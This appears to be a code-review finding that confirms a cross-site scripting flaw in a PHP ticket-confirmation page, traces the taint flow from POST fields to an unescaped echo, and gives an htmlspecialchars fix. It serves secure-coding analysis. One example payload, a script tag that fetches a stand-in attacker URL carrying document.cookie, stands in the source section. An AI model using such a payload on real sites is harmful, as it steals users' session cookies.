## Verdict

Confirmed. `ConfirmationPageRenderer::render()` writes `$message` (and `$ticketId`) directly into the HTML response with no output encoding, and `$message` carries attacker-controlled data that originates from the HTTP request.

## Source

`TicketController::handleSubmit()` (TicketController.php, lines 11-12) reads two request parameters straight from the superglobal:

- `$_POST['customer_name']` (only `trim()`-ed, no encoding)
- `$_POST['comment']` (used as-is)

These are passed to `TicketService::createTicket()`, which forwards them unchanged to `NotificationDispatcher::sendConfirmation()`. There, `$customerName` and `$comment` are concatenated into a single `$message` string (NotificationDispatcher.php, lines 11-12):

```
$greeting = $customerName !== '' ? "Thanks, {$customerName}!" : 'Thanks for reaching out!';
$message = $greeting . " We've logged ticket {$ticketId}. Your note: " . $comment;
```

That composed `$message` is handed to `ConfirmationPageRenderer::render($ticketId, $message)`, which echoes it straight into the page body:

```
echo '<p>' . $message . '</p>';   // line 11 - the reported sink
```

Because `$message` embeds `$customerName` and `$comment` byte-for-byte, an attacker who submits a comment such as `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>` gets that markup rendered verbatim in every visitor's/agent's browser that views the confirmation page - a classic reflected/stored XSS depending on how the confirmation is served. `$ticketId` itself is server-generated via `uniqid()` and is not attacker-influenced, so it is not the exploitable part of this finding, but it shares the same unescaped `echo` pattern at line 9.

## Fix

Encode for the HTML context at the point where data is written into the response - i.e. in `ConfirmationPageRenderer::render()`, which is the true output boundary for this call chain. Escape both interpolated values with `htmlspecialchars()` before they are echoed:

```php
<?php

// Renders the HTML confirmation page shown after a ticket is filed.
class ConfirmationPageRenderer
{
    public function render(string $ticketId, string $message): void
    {
        echo '<!DOCTYPE html><html><head><title>Ticket Submitted</title></head><body>';
        echo '<div class="confirmation" data-ticket-id="' . htmlspecialchars($ticketId, ENT_QUOTES, 'UTF-8') . '">';
        echo '<p>' . htmlspecialchars($message, ENT_QUOTES, 'UTF-8') . '</p>';
        echo '</div></body></html>';
    }
}
```

`ENT_QUOTES` is used so both the double-quoted `data-ticket-id` attribute and the element content are safe against attribute-breakout and tag-injection payloads; `'UTF-8'` pins the encoding so multi-byte sequences can't be abused to bypass the entity conversion.

This is the minimal, correct fix because `$message` in this code path is always plain customer-supplied text with no legitimate HTML markup - there is nothing to preserve by allowlisting tags, so blanket escaping is appropriate rather than a sanitizer. Fixing at the renderer (the sink) also covers the value regardless of which upstream caller builds the string, rather than requiring every caller of `NotificationDispatcher` to remember to pre-escape its inputs.

## Explanation

The vulnerability is a straightforward taint-flow: `$_POST['comment']` / `$_POST['customer_name']` (source, TicketController.php) pass unmodified through `TicketService::createTicket()` and `NotificationDispatcher::sendConfirmation()`, where they are string-concatenated into `$message`, and finally reach `echo` inside an HTML document body in `ConfirmationPageRenderer::render()` (sink). No function in the chain performs contextual output encoding, so anything the customer types into the comment field is interpreted by the browser as HTML/JavaScript rather than as inert text.

Fixing this by encoding at the sink is preferable to trying to sanitize earlier in the chain (e.g. in the controller) because: the renderer is the only place that definitively knows the output context (HTML body / HTML attribute) and is the last line of defense if any future caller reuses `NotificationDispatcher` or `ConfirmationPageRenderer` with different or additional untrusted inputs; escaping too early (e.g., in `TicketController`) would also risk double-encoding if the value is reused elsewhere for a non-HTML purpose (logging, database storage, etc.), which `TicketService::createTicket()` already does via `error_log()`. Keeping the raw value intact through the business-logic layers and encoding only at final HTML output preserves data fidelity while eliminating the injection.
